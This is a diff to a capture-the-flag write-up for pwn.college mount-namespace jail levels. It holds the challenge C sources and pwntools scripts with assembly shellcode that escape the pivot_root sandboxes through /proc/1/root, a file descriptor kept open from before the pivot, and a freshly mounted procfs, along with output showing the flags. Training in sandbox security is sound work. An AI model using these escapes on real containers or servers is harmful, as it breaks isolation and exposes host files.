@@ -3635,7 +3635,7 @@ $
 
 &nbsp;
 
-## mount-namespace-2
+## mount-cleanup
 
 > Learn the implications of a different way of sandboxing, using modern namespacing techniques! But what if the sandbox is really sloppy?
 
@@ -3765,28 +3765,38 @@ int main(int argc, char **argv, char **envp)
 This level fixes the previous mistake — the old root is now properly detached after the pivot:
 
 ```c
+# ---- snip ----
+
 puts("... unmounting old root directory.");
 assert(umount2("/old", MNT_DETACH) != -1);
 assert(rmdir("/old") != -1);
+
+# ---- snip ----
 ```
 
 So `/old` is gone and the previous escape no longer works.
 
-### The Bug
-
 However, before unmounting `/old`, the challenge bind-mounts several directories from the real filesystem into the jail:
 
 ```c
+# ---- snip ----
+
 assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);
 assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);
 assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);
 assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);
+
+# ---- snip ----
 ```
 
 The source even hints at this:
 
 ```c
+# ---- snip ----
+
 puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
+
+# ---- snip ----
 ```
 
 These bind mounts are independent mount table entries that point directly at the underlying inodes of `/bin`, `/usr`, `/lib`, `/lib64` on the real host filesystem. Since the jail runs as root and these mounts are writable, any file we create inside `/bin` from within the jail is actually written to the real host's `/bin`.
@@ -3832,4 +3842,775 @@ pwn.college{IH60WiwTvVZzkOYQdXpKfLset9i.dhDMzMDL4ITM0EzW}
 
 &nbsp;
 
-## 
+## mount-readonly
+
+> Learn the implications of a different way of sandboxing, using modern namespacing techniques! But what shenanigans can you get up to with special kernel-backed filesystems?
+
+```c title="/challenge/babyjail_level16.c" showLineNumbers
+#define _GNU_SOURCE 1
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <libgen.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/signal.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/sendfile.h>
+#include <sys/prctl.h>
+#include <sys/personality.h>
+#include <arpa/inet.h>
+
+#include <sys/syscall.h>
+#include <sys/mount.h>
+#include <dirent.h>
+#include <limits.h>
+#include <sched.h>
+
+char hostname[128];
+
+int main(int argc, char **argv, char **envp)
+{
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    printf("###\n");
+    printf("### Welcome to %s!\n", argv[0]);
+    printf("###\n");
+    printf("\n");
+
+    gethostname(hostname, 128);
+    if (strstr(hostname, "-level") && !strstr(hostname, "vm_"))
+    {
+        puts("ERROR: in the dojo, this challenge MUST run in virtualization mode.");
+        exit(1);
+    }
+
+    puts("This challenge will use mount namespace and pivot_root to put you into a jail in /tmp/jail-XXXXXX...\n");
+
+    for (int i = 3; i < 10000; i++) close(i);
+
+    char new_root[] = "/tmp/jail-XXXXXX";
+    char old_root[PATH_MAX];
+
+    puts("Checking that the challenge is running as root (otherwise things will fail)...");
+    assert(geteuid() == 0);
+
+    puts("Splitting off into our own mount namespace...");
+    assert(unshare(CLONE_NEWNS) != -1);
+
+    puts("Creating a jail structure!");
+    puts("... creating jail root...");
+    assert(mkdtemp(new_root) != NULL);
+    printf("... created jail root at `%s`.\n", new_root);
+
+    puts("... changing the old / to a private mount so that pivot_root succeeds later.");
+    assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);
+
+    puts("... bind-mounting the new root over itself so that it becomes a 'mount point' for pivot_root() later.");
+    assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);
+
+    puts("... creating a directory in which pivot_root will put the old root filesystem.");
+    snprintf(old_root, sizeof(old_root), "%s/old", new_root);
+    assert(mkdir(old_root, 0777) != -1);
+
+    puts("... pivoting the root filesystem!");
+    assert(syscall(SYS_pivot_root, new_root, old_root) != -1);
+
+    assert(mkdir("/bin", 0755) != -1);
+    puts("... bind-mounting /bin into the jail.");
+    assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);
+    puts("... making /bin read-only...");
+    assert(mount(NULL, "/bin", NULL, MS_REMOUNT|MS_RDONLY|MS_BIND, NULL) != -1);
+
+    assert(mkdir("/usr", 0755) != -1);
+    puts("... bind-mounting /usr into the jail.");
+    assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);
+    puts("... making /usr read-only...");
+    assert(mount(NULL, "/usr", NULL, MS_REMOUNT|MS_RDONLY|MS_BIND, NULL) != -1);
+
+    assert(mkdir("/lib", 0755) != -1);
+    puts("... bind-mounting /lib into the jail.");
+    assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);
+    puts("... making /lib read-only...");
+    assert(mount(NULL, "/lib", NULL, MS_REMOUNT|MS_RDONLY|MS_BIND, NULL) != -1);
+
+    assert(mkdir("/lib64", 0755) != -1);
+    puts("... bind-mounting /lib64 into the jail.");
+    assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);
+    puts("... making /lib64 read-only...");
+    assert(mount(NULL, "/lib64", NULL, MS_REMOUNT|MS_RDONLY|MS_BIND, NULL) != -1);
+
+    assert(mkdir("/proc", 0755) != -1);
+    puts("... bind-mounting /proc into the jail.");
+    assert(mount("/old/proc", "/proc", NULL, MS_BIND, NULL) != -1);
+    puts("... making /proc read-only...");
+    assert(mount(NULL, "/proc", NULL, MS_REMOUNT|MS_RDONLY|MS_BIND, NULL) != -1);
+
+    puts("... unmounting old root directory.");
+    assert(umount2("/old", MNT_DETACH) != -1);
+    assert(rmdir("/old") != -1);
+
+    setresuid(0, 0, 0);
+
+    puts("Moving the current working directory into the jail.\n");
+    assert(chdir("/") == 0);
+
+    int fffd = open("/flag", O_WRONLY | O_CREAT);
+    write(fffd, "FLAG{FAKE}", 10);
+    close(fffd);
+
+    puts("Executing a shell inside the sandbox! Good luck!");
+    assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);
+
+    printf("### Goodbye!\n");
+}
+```
+
+This level fixes the previous exploit by remounting all bind-mounted directories as read-only:
+
+```c
+# ---- snip ----
+
+assert(mount(NULL, "/bin", NULL, MS_REMOUNT|MS_RDONLY|MS_BIND, NULL) != -1);
+assert(mount(NULL, "/usr", NULL, MS_REMOUNT|MS_RDONLY|MS_BIND, NULL) != -1);
+assert(mount(NULL, "/lib", NULL, MS_REMOUNT|MS_RDONLY|MS_BIND, NULL) != -1);
+assert(mount(NULL, "/lib64", NULL, MS_REMOUNT|MS_RDONLY|MS_BIND, NULL) != -1);
+assert(mount(NULL, "/proc", NULL, MS_REMOUNT|MS_RDONLY|MS_BIND, NULL) != -1);
+
+# ---- snip ----
+```
+
+So planting a SUID binary through a writable bind mount is no longer possible.
+
+However, this level introduces something new: `/proc` is now mounted inside the jail.
+
+`/proc` is a virtual filesystem that exposes the kernel's live view of every process on the system. Crucially, it contains entries for processes running outside the jail on the real host. One of the most useful is:
+
+```
+/proc/1/root
+```
+
+This is a symlink to the root filesystem of PID 1 (`init`), which is running on the real host outside the jail. Following it gives us direct access to the real host's `/`.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+context.log_level = "error"
+
+p = process("/challenge/babyjail_level16")
+
+p.recvuntil(b"Good luck!")
+
+p.sendline(b"cat /proc/1/root/flag")
+
+p.interactive()
+```
+
+```
+hacker@sandboxing~mount-readonly:~$ python ~/script.py
+
+pwn.college{AVgmw2PR5ANcBU7LKFqbKRKoORY.dlDMzMDL4ITM0EzW}
+$  
+```
+
+&nbsp;
+
+## mount-shellcode
+
+> Learn the implications of a different way of sandboxing, using modern namespacing techniques! But what happens if you can smuggle in a resource from the outside?
+
+```c title="/challenge/babyjail_level17.c" showLineNumbers
+#define _GNU_SOURCE 1
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <libgen.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/signal.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/sendfile.h>
+#include <sys/prctl.h>
+#include <sys/personality.h>
+#include <arpa/inet.h>
+
+#include <sys/syscall.h>
+#include <sys/mount.h>
+#include <dirent.h>
+#include <limits.h>
+#include <sched.h>
+
+char hostname[128];
+
+int main(int argc, char **argv, char **envp)
+{
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");
+    puts("You may upload custom shellcode to do whatever you want.\n");
+
+    assert(argc > 1);
+
+    for (int i = 3; i < 10000; i++) close(i);
+
+    puts("Checking to make sure you're not trying to open the flag.\n");
+    assert(strstr(argv[1], "flag") == NULL);
+
+    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+    if (fd < 0)
+        printf("Failed to open the file located at `%s`.\n", argv[1]);
+    else
+        printf("Successfully opened the file located at `%s`.\n", argv[1]);
+
+    char new_root[] = "/tmp/jail-XXXXXX";
+    char old_root[PATH_MAX];
+
+    assert(geteuid() == 0);
+    assert(unshare(CLONE_NEWNS) != -1);
+    assert(mkdtemp(new_root) != NULL);
+    assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);
+    assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);
+    snprintf(old_root, sizeof(old_root), "%s/old", new_root);
+    assert(mkdir(old_root, 0777) != -1);
+    assert(syscall(SYS_pivot_root, new_root, old_root) != -1);
+    assert(umount2("/old", MNT_DETACH) != -1);
+    assert(rmdir("/old") != -1);
+
+    setresuid(0, 0, 0);
+    assert(chdir("/") == 0);
+
+    int fffd = open("/flag", O_WRONLY | O_CREAT);
+    write(fffd, "FLAG{FAKE}", 10);
+    close(fffd);
+
+    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+    assert(shellcode == (void *)0x1337000);
+
+    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
+    int shellcode_size = read(0, shellcode, 0x1000);
+
+    puts("Executing shellcode!\n");
+    ((void(*)())shellcode)();
+
+    printf("### Goodbye!\n");
+}
+```
+
+This level is a clean jail — the old root is properly detached, no bind mounts, no `/proc` left behind. The mount side is airtight.
+
+But two new things are introduced.
+
+**First**, a file is opened before the jail is set up:
+
+```c
+assert(strstr(argv[1], "flag") == NULL);
+
+int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+```
+
+The file is opened on the real host filesystem **before** `pivot_root` happens. File descriptors survive mount namespace changes — the FD remains valid and still points to the real file even after the pivot.
+
+**Second**, shellcode execution is provided inside the jail:
+
+```c
+void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+read(0, shellcode, 0x1000);
+((void(*)())shellcode)();
+```
+
+There are two guards on the open call:
+
+- `strstr(argv[1], "flag")` — blocks any path containing the string `"flag"`
+- `O_NOFOLLOW` — blocks opening a file if the final path component is a symlink
+
+The key insight is that `strstr` only checks `argv[1]` — it has no visibility into what the shellcode does at runtime. And `O_NOFOLLOW` only blocks the final component being a symlink.
+
+We can pass `/` as `argv[1]`. It contains no `"flag"`, it is not a symlink, and `O_NOFOLLOW` won't block it. FD `3` is now a direct reference to the real host's `/` opened **before** the pivot.
+
+Inside the shellcode, we call `openat(3, "flag", O_RDONLY)`. The string `"flag"` is embedded in the shellcode binary — `strstr` never sees it. `openat` resolves `"flag"` relative to FD `3`, which points to the real host `/`, giving us the real flag.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.log_level = "error"
+
+shellcode = asm("""
+    /* openat(3, "flag", O_RDONLY) */
+    mov rdi, 3
+    lea rsi, [rip+path]
+    xor rdx, rdx
+    mov rax, 257
+    syscall
+
+    /* read(fd, buf, 100) */
+    mov rdi, rax
+    lea rsi, [rip+buf]
+    mov rdx, 100
+    xor rax, rax
+    syscall
+
+    /* write(1, buf, rax) */
+    mov rdx, rax
+    mov rdi, 1
+    lea rsi, [rip+buf]
+    mov rax, 1
+    syscall
+
+    ret
+path:
+    .asciz "flag"
+buf:
+    .space 100
+""")
+
+p = process(["/challenge/babyjail_level17", "/"])
+
+p.recvuntil(b"Reading 0x1000 bytes of shellcode from stdin.\n")
+
+p.send(shellcode)
+
+p.interactive()
+```
+
+```
+hacker@sandboxing~mount-shellcode:~$ python ~/script.py
+
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x0000000001337000 | 48 c7 c7 03 00 00 00                          | mov rdi, 3
+0x0000000001337007 | 48 8d 35 40 00 00 00                          | lea rsi, [rip + 0x40]
+0x000000000133700e | 48 31 d2                                      | xor rdx, rdx
+0x0000000001337011 | 48 31 c0                                      | xor rax, rax
+0x0000000001337014 | 48 c7 c0 01 01 00 00                          | mov rax, 0x101
+0x000000000133701b | 0f 05                                         | syscall 
+0x000000000133701d | 48 89 c7                                      | mov rdi, rax
+0x0000000001337020 | 48 8d 35 2c 00 00 00                          | lea rsi, [rip + 0x2c]
+0x0000000001337027 | 48 c7 c2 64 00 00 00                          | mov rdx, 0x64
+0x000000000133702e | 48 31 c0                                      | xor rax, rax
+0x0000000001337031 | 0f 05                                         | syscall 
+0x0000000001337033 | 48 89 c2                                      | mov rdx, rax
+0x0000000001337036 | 48 c7 c7 01 00 00 00                          | mov rdi, 1
+0x000000000133703d | 48 8d 35 0f 00 00 00                          | lea rsi, [rip + 0xf]
+0x0000000001337044 | 48 c7 c0 01 00 00 00                          | mov rax, 1
+0x000000000133704b | 0f 05                                         | syscall 
+0x000000000133704d | c3                                            | ret 
+0x000000000133704e | 66 6c                                         | insb byte ptr [rdi], dx
+
+Executing shellcode!
+
+pwn.college{8-5lvmm_kaskvvSxmInDz3c50L2.dBTMzMDL4ITM0EzW}
+### Goodbye!
+$  
+```
+
+&nbsp;
+
+## mount-bindmount
+
+> Learn the implications of a different way of sandboxing, using modern namespacing techniques! What could be the harm of mounting in a harmless directory?
+
+```c title="/challenge/babyjail_level18.c" showLineNumbers
+#define _GNU_SOURCE 1
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <libgen.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/signal.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/sendfile.h>
+#include <sys/prctl.h>
+#include <sys/personality.h>
+#include <arpa/inet.h>
+
+#include <capstone/capstone.h>
+
+#define CAPSTONE_ARCH CS_ARCH_X86
+#define CAPSTONE_MODE CS_MODE_64
+
+void print_disassembly(void *shellcode_addr, size_t shellcode_size)
+{
+    csh handle;
+    cs_insn *insn;
+    size_t count;
+
+    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
+    {
+        printf("ERROR: disassembler failed to initialize.\n");
+        return;
+    }
+
+    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
+    if (count > 0)
+    {
+        size_t j;
+        printf("      Address      |                      Bytes                    |          Instructions\n");
+        printf("------------------------------------------------------------------------------------------\n");
+
+        for (j = 0; j < count; j++)
+        {
+            printf("0x%016lx | ", (unsigned long)insn[j].address);
+            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
+            for (int k = insn[j].size; k < 15; k++) printf("   ");
+            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
+        }
+
+        cs_free(insn, count);
+    }
+    else
+    {
+        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
+        printf("      Address      |                      Bytes\n");
+        printf("--------------------------------------------------------------------\n");
+        for (unsigned int i = 0; i <= shellcode_size; i += 16)
+        {
+            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
+            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
+            printf("\n");
+        }
+    }
+
+    cs_close(&handle);
+}
+#include <sys/syscall.h>
+#include <sys/mount.h>
+#include <dirent.h>
+#include <limits.h>
+#include <sched.h>
+
+char hostname[128];
+
+int main(int argc, char **argv, char **envp)
+{
+    // assert(argc > 0);
+
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    printf("###\n");
+    printf("### Welcome to %s!\n", argv[0]);
+    printf("###\n");
+    printf("\n");
+
+    gethostname(hostname, 128);
+    if (strstr(hostname, "-level") && !strstr(hostname, "vm_"))
+    {
+        puts("ERROR: in the dojo, this challenge MUST run in virtualization mode.");
+        puts("Please run `vm connect` to launch and connect to the Virtual Machine, then run this challenge inside the VM.");
+        puts("You can tell when you are running inside the VM by looking at the hostname in your shell prompt:.");
+        puts("if it starts with \"vm_\", you are executing inside the Virtual Machine.");
+        puts("");
+        puts("You can connect to the VM from multiple terminals by launching `vm connect` in each terminal, and all files");
+        puts("are shared between the VM and the normal container.");
+        exit(1);
+    }
+
+    puts("This challenge will use mount namespace and pivot_root to put you into a jail in /tmp/jail-XXXXXX. You will be able to");
+    puts("easily read a fake flag file inside this jail, not the real flag file outside of it. If you want the real flag, you must");
+    puts("escape.\n");
+
+    puts("You may pick a directory (with many restrictions), as given by the first argument to the program (argv[1]). This");
+    puts("directory will be bind-mounted into your jail.\n");
+    puts("You may upload custom shellcode to do whatever you want.\n");
+
+    assert(argc > 1);
+
+    for (int i = 3; i < 10000; i++) close(i);
+
+    puts("Checking your data directory path for shenanigans...");
+    assert(argv[1][0] == '/');
+    assert(strstr(argv[1], ".") == NULL);
+    assert(strstr(argv[1], "flag") == NULL);
+    assert(strstr(argv[1], "root") == NULL);
+    assert(strstr(argv[1], "tmp") == NULL);
+    assert(strstr(argv[1], "var") == NULL);
+    assert(strstr(argv[1], "run") == NULL);
+    assert(strstr(argv[1], "dev") == NULL);
+    assert(strstr(argv[1], "fd") == NULL);
+    if (strstr(argv[1], "home")) assert(strcmp("/home/hacker", argv[1]) == 0);
+    else
+    {
+        puts("... to minimize shenanigans, we only support your home dir or a non-writable leaf directory (no subdirs).");
+        struct stat statbuf;
+        struct dirent *dent;
+        char dirpath[1024];
+        DIR *dir;
+
+        assert(lstat(argv[1], &statbuf) != -1);
+        assert(S_ISDIR(statbuf.st_mode));
+        assert(dir = opendir(argv[1]));
+        while ((dent = readdir(dir)) != NULL)
+        {
+            if (strcmp(dent->d_name, ".") == 0 || strcmp(dent->d_name, "..") == 0) continue;
+            snprintf(dirpath, 1024, "%s/%s", argv[1], dent->d_name);
+            printf("... making sure %s is not a directory\n", dirpath);
+            assert(stat(dirpath, &statbuf) != -1);
+            assert(!S_ISDIR(statbuf.st_mode));
+        }
+        closedir(dir);
+    }
+
+    char new_root[] = "/tmp/jail-XXXXXX";
+    char old_root[PATH_MAX];
+
+    puts("Checking that the challenge is running as root (otherwise things will fail)...");
+    assert(geteuid() == 0);
+
+    puts("Splitting off into our own mount namespace...");
+    assert(unshare(CLONE_NEWNS) != -1);
+
+    // create the new root
+    puts("Creating a jail structure!");
+    puts("... creating jail root...");
+    assert(mkdtemp(new_root) != NULL);
+    printf("... created jail root at `%s`.\n", new_root);
+
+    // change the old root (/) to a private mount so that changes aren't propagated to parent mount namespaces
+    // (note: rather than doing this propagation, pivot_root will just fail)
+    puts("... changing the old / to a private mount so that pivot_root succeeds later.");
+    assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);
+
+    puts("... bind-mounting the new root over itself so that it becomes a 'mount point' for pivot_root() later.");
+    assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);
+
+    puts("... creating a directory in which pivot_root will put the old root filesystem.");
+    snprintf(old_root, sizeof(old_root), "%s/old", new_root);
+    assert(mkdir(old_root, 0777) != -1);
+
+    puts("... pivoting the root filesystem!");
+    assert(syscall(SYS_pivot_root, new_root, old_root) != -1);
+
+    char dirpath[1024];
+    snprintf(dirpath, 1024, "/old%s", argv[1]);
+    printf("... bind-mounting (read-only) %s for you into /data in the jail.\n", dirpath);
+    assert(mkdir("/data", 0755) != -1);
+    assert(mount(dirpath, "/data", NULL, MS_BIND, NULL) != -1);
+    assert(mount(NULL, "/data", NULL, MS_REMOUNT|MS_RDONLY|MS_BIND, NULL) != -1);
+
+    // let's remove the old root mount
+    puts("... unmounting old root directory.");
+    assert(umount2("/old", MNT_DETACH) != -1);
+    assert(rmdir("/old") != -1);
+
+    // make things simpler for everyone to avoid strange behavior with permissions
+    setresuid(0, 0, 0);
+
+    puts("Moving the current working directory into the jail.\n");
+    assert(chdir("/") == 0);
+
+    int fffd = open("/flag", O_WRONLY | O_CREAT);
+    write(fffd, "FLAG{FAKE}", 10);
+    close(fffd);
+
+    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+    assert(shellcode == (void *)0x1337000);
+    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);
+
+    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
+    int shellcode_size = read(0, shellcode, 0x1000);
+
+    puts("This challenge is about to execute the following shellcode:\n");
+    print_disassembly(shellcode, shellcode_size);
+    puts("");
+
+    puts("Executing shellcode!\n");
+
+    ((void(*)())shellcode)();
+
+    printf("### Goodbye!\n");
+}
+```
+
+This level lets us bind-mount a directory into the jail at `/data`. The checks on `argv[1]` are strict:
+
+```c
+# ---- snip ----
+
+assert(argv[1][0] == '/');
+assert(strstr(argv[1], ".") == NULL);
+assert(strstr(argv[1], "flag") == NULL);
+assert(strstr(argv[1], "root") == NULL);
+assert(strstr(argv[1], "tmp") == NULL);
+assert(strstr(argv[1], "var") == NULL);
+assert(strstr(argv[1], "run") == NULL);
+assert(strstr(argv[1], "dev") == NULL);
+assert(strstr(argv[1], "fd") == NULL);
+
+# ---- snip ----
+```
+
+And if it's not `/home/hacker`, it must be a leaf directory — no subdirectories, checked with `lstat` so symlinks in the path don't fool it.
+
+But `/home/hacker` is explicitly allowed with no restrictions:
+
+```c
+# ---- snip ----
+
+if (strstr(argv[1], "home")) assert(strcmp("/home/hacker", argv[1]) == 0);
+
+# ---- snip ----
+```
+
+The jail is otherwise clean — old root detached, no `/proc`, no leftover bind mounts.
+
+The shellcode runs as root inside the jail with no seccomp restrictions. There is nothing stopping us from calling `mount` directly from the shellcode.
+
+We can mount a fresh `procfs` inside the jail ourselves:
+
+```c
+mount("proc", "/proc", "proc", 0, NULL)
+```
+
+A freshly mounted `procfs` exposes the kernel's live view of all processes on the host system, including PID 1. `/proc/1/root` is a symlink to the root filesystem of PID 1, which runs on the real host outside the jail.
+
+So the escape is — from shellcode, create `/proc`, mount a fresh `procfs` on it, then read `/proc/1/root/flag`.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.log_level = "error"
+
+shellcode = asm("""
+    /* mkdir("/proc", 0755) */
+    lea rdi, [rip+proc_path]
+    mov rsi, 0755
+    mov rax, 83
+    syscall
+
+    /* mount("proc", "/proc", "proc", 0, NULL) */
+    lea rdi, [rip+proc_str]
+    lea rsi, [rip+proc_path]
+    lea rdx, [rip+proc_str]
+    xor r10, r10
+    xor r8, r8
+    mov rax, 165
+    syscall
+
+    /* open("/proc/1/root/flag", O_RDONLY) */
+    lea rdi, [rip+flag_path]
+    xor rsi, rsi
+    mov rax, 2
+    syscall
+
+    /* read(fd, buf, 100) */
+    mov rdi, rax
+    lea rsi, [rip+buf]
+    mov rdx, 100
+    xor rax, rax
+    syscall
+
+    /* write(1, buf, rax) */
+    mov rdx, rax
+    mov rdi, 1
+    lea rsi, [rip+buf]
+    mov rax, 1
+    syscall
+
+    ret
+proc_str:
+    .asciz "proc"
+proc_path:
+    .asciz "/proc"
+flag_path:
+    .asciz "/proc/1/root/flag"
+buf:
+    .space 100
+""")
+
+p = process(["/challenge/babyjail_level18", "/home/hacker"])
+
+p.recvuntil(b"Reading 0x1000 bytes of shellcode from stdin.\n")
+
+p.send(shellcode)
+
+p.interactive()
+```
+
+```
+hacker@sandboxing~mount-bindmount:~$ python ~/script.py
+
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x0000000001337000 | 48 8d 3d 7d 00 00 00                          | lea rdi, [rip + 0x7d]
+0x0000000001337007 | 48 c7 c6 ed 01 00 00                          | mov rsi, 0x1ed
+0x000000000133700e | 48 c7 c0 53 00 00 00                          | mov rax, 0x53
+0x0000000001337015 | 0f 05                                         | syscall 
+0x0000000001337017 | 48 8d 3d 61 00 00 00                          | lea rdi, [rip + 0x61]
+0x000000000133701e | 48 8d 35 5f 00 00 00                          | lea rsi, [rip + 0x5f]
+0x0000000001337025 | 48 8d 15 53 00 00 00                          | lea rdx, [rip + 0x53]
+0x000000000133702c | 4d 31 d2                                      | xor r10, r10
+0x000000000133702f | 4d 31 c0                                      | xor r8, r8
+0x0000000001337032 | 48 c7 c0 a5 00 00 00                          | mov rax, 0xa5
+0x0000000001337039 | 0f 05                                         | syscall 
+0x000000000133703b | 48 8d 3d 48 00 00 00                          | lea rdi, [rip + 0x48]
+0x0000000001337042 | 48 31 f6                                      | xor rsi, rsi
+0x0000000001337045 | 48 c7 c0 02 00 00 00                          | mov rax, 2
+0x000000000133704c | 0f 05                                         | syscall 
+0x000000000133704e | 48 89 c7                                      | mov rdi, rax
+0x0000000001337051 | 48 8d 35 44 00 00 00                          | lea rsi, [rip + 0x44]
+0x0000000001337058 | 48 c7 c2 64 00 00 00                          | mov rdx, 0x64
+0x000000000133705f | 48 31 c0                                      | xor rax, rax
+0x0000000001337062 | 0f 05                                         | syscall 
+0x0000000001337064 | 48 89 c2                                      | mov rdx, rax
+0x0000000001337067 | 48 c7 c7 01 00 00 00                          | mov rdi, 1
+0x000000000133706e | 48 8d 35 27 00 00 00                          | lea rsi, [rip + 0x27]
+0x0000000001337075 | 48 c7 c0 01 00 00 00                          | mov rax, 1
+0x000000000133707c | 0f 05                                         | syscall 
+0x000000000133707e | c3                                            | ret 
+0x000000000133707f | 70 72                                         | jo 0x13370f3
+0x0000000001337081 | 6f                                            | outsd dx, dword ptr [rsi]
+
+Executing shellcode!
+
+pwn.college{UlIx6eyD96dkKFZANN4dyZQvlf6.dFTMzMDL4ITM0EzW}
+### Goodbye!
+$  
+```
